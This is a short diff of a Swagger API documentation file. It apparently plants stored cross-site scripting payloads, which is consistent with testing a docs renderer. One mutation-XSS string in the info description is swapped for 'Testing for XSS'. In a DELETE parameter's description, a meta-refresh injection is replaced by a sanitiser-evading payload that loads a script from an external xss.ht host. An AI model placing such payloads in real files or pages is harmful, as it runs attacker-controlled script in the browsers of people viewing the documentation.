@@ -3,7 +3,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></script><script src=https://s4rv3r.xss.ht></script><!--"></form>
+    Testing for XSS
 
   version: production
 basePath: https://google.com
@@ -29,7 +29,7 @@ paths:
     delete:
       parameters:
       - description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><META HTTP-EQUIV=refresh CONTENT=1>"></form>
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></script><script src=https://s4rv3r.xss.ht></script><!--"></form>
 
         format: int64
         in: path
